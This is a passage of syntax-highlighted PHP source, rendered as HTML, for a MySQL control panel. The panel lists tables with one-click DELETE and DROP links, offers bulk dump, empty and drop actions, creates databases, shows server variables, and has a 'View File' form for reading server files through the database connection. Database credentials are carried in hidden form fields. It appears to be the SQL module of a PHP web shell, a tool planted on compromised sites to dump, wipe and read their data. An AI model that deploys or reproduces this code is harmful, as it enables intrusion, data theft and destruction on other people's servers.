      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input name=&#39;act&#39; type=&#39;hidden&#39; value=&#39;sql&#39;&amp;gt;&amp;lt;input name=&#39;sql_login&#39; type=&#39;hidden&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_login</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input name=&#39;sql_server&#39; type=&#39;hidden&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_server</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input name=&#39;sql_port&#39; type=&#39;hidden&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_port</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input name=&#39;sql_db&#39; type=&#39;hidden&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_db</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input name=&#39;sql_passwd&#39; type=&#39;hidden&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nv">$sql_passwd</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxtbl_all</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Table&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Rows&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Type&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Created&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Modified&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Size&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
      <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="nv">$tsize</span> <span class="o">=</span> <span class="nv">$trows</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span>
      <span class="p">{</span>
       <span class="nv">$tsize</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">];</span>
       <span class="nv">$trows</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">];</span>
       <span class="nv">$size</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">]);</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxtbl[]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>

       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Type&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Create_time&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Update_time&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$size</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>

       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_act.value=&#39;query&#39;;document.sql.sql_query.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;EMPT&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_act.value=&#39;query&#39;;document.sql.sql_query.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DROP TABLE `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;DROP&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_tbl.value=&#39;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_tbl_act.value=&#39;insert&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;INS&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
       <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
       <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr bgcolor=</span><span class="se">\&quot;</span><span class="s2">000000</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot; table(s)&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$trows</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nv">$tsize</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;p align=</span><span class="se">\&quot;</span><span class="s2">right</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;With selected:&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tbldrop</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Drop&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblempty</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Empty&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tbldump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Dump&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblcheck</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Check table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tbloptimize</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Optimize table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblrepair</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Repair table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblanalyze</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Analyze table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">;</span>
      <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
     <span class="p">}</span>
    <span class="p">}</span>
   <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;newdb&quot;</span><span class="p">,</span><span class="s2">&quot;serverstatus&quot;</span><span class="p">,</span><span class="s2">&quot;servervars&quot;</span><span class="p">,</span><span class="s2">&quot;processes&quot;</span><span class="p">,</span><span class="s2">&quot;getfile&quot;</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span> <span class="p">{</span><span class="cp">?&gt;</span><span class="x">&amp;lt;table border=&quot;0&quot; width=&quot;100%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;Create new DB:&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newdb&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_newdb&quot; size=&quot;20&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=&quot;submit&quot; value=&quot;Create&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;View File:&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;getfile&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_getfile&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=&quot;submit&quot; value=&quot;Get&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span><span class="cp">&lt;?php</span> <span class="p">}</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span>
   <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newdb&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&amp;lt;br&amp;gt;Reason:&amp;lt;/b&amp;gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;serverstatus&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Server-status variables:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Name&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Value&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;servervars&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW VARIABLES&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
